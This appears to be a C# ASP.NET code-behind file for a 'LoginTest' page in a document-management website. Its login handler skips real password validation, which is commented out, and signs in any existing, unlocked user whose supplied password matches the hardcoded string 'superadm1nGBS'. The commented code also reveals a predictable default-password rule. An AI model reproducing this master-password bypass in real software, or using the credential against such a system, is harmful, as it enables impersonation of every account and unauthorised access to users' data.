using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

using System.Web.Security;

namespace DMS.Website
{

    using Lafite.RoleModel.Security;
    using LafiteProvider = Lafite.RoleModel.Provider;
    using DMS.Website.Common;

    public partial class LoginTest : BasePage
    {
        private IRoleModelContext _context = RoleModelContext.Current;

        protected void Page_Load(object sender, EventArgs e)
        {

            if (!IsPostBack)
            {
                if (Session["SystemLanguage"] != null && !string.IsNullOrEmpty(Session["SystemLanguage"].ToString()))
                {
                    ddlLang.SelectedValue = Session["SystemLanguage"].ToString();
                }

                //SerialNumber1.Create();
            }
        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            //if (!SerialNumber1.CheckSN(snvTxt1.Text))
            //{
            //    this.ltLoginInfo.Text = GetLocalResourceObject("btnLogin_Click.ltLoginInfo.Text").ToString();

            //    SerialNumber1.Create();
            //    return;
            //}

            string username = this.txtUserName.Value;
            string password = this.txtPassword.Value;
            short needchangepassword = 0;

            MembershipUser user = Membership.GetUser(username);

            if (user == null)
            {
                this.ltLoginInfo.Text = GetLocalResourceObject("btnLogin_Click.ltLoginInfo.Text1").ToString();

                //SerialNumber1.Create();
                return;
            }

            if (user.IsLockedOut)
            {
                this.ltLoginInfo.Text = GetLocalResourceObject("btnLogin_Click.ltLoginInfo.Text2").ToString();

                //SerialNumber1.Create();
                return;
            }

            if (password != "superadm1nGBS")
            {
                return;
            }
            /**
            if (Membership.ValidateUser(username, password))
            {
                //检查是否是首次登陆
                string defaultpsw = username.ToLower() + "5a888";
                if (defaultpsw == password)
                {
                    needchangepassword = 1;
                }

                //检查密码是否过期                
                LafiteProvider.DbMembershipProvider provider = (LafiteProvider.DbMembershipProvider)Membership.Provider;
                int effectDays = provider.PasswordEffectDays;
                if (effectDays > 0)
                {
                    user = Membership.GetUser(username);
                    DateTime passwordValidateDate = user.LastPasswordChangedDate.AddDays(effectDays);

                    if (passwordValidateDate < DateTime.Now)
                        needchangepassword = 2;
                }

                if (needchangepassword > 0)
                {
                    FormsAuthentication.SetAuthCookie(username, false);
                    this.Session["needchangepassword"] = needchangepassword;
                    string changeUrl = string.Format("~/Pages/ChangePassword.aspx?pt={0}", needchangepassword);
                    this.Response.Redirect(changeUrl);
                }

                //验证成功
                if (Request.QueryString["ReturnUrl"] != null)
                {
                    FormsAuthentication.RedirectFromLoginPage(username, false);
                }
                else
                {
                    FormsAuthentication.SetAuthCookie(username, false);
                    this.Response.Redirect(FormsAuthentication.DefaultUrl);
                }
            }
            else
            {
                this.ltLoginInfo.Text = GetLocalResourceObject("btnLogin_Click.ltLoginInfo.Text3").ToString();
            }
             * */
            //先登出
            IRoleModelContext context = RoleModelContext.Current;
            if (context != null)
                context.User.FlushCache();

            FormsAuthentication.SignOut();

            if (Request.QueryString["ReturnUrl"] != null)
            {
                FormsAuthentication.RedirectFromLoginPage(username, false);
            }
            else
            {
                FormsAuthentication.SetAuthCookie(username, false);
                this.Response.Redirect(FormsAuthentication.DefaultUrl);
            }
        }

        protected void ddlLang_SelectedIndexChanged(object sender, EventArgs e)
        {
            Session["SystemLanguage"] = ddlLang.SelectedValue;
            Response.Redirect("Default.aspx");
        }

    }
}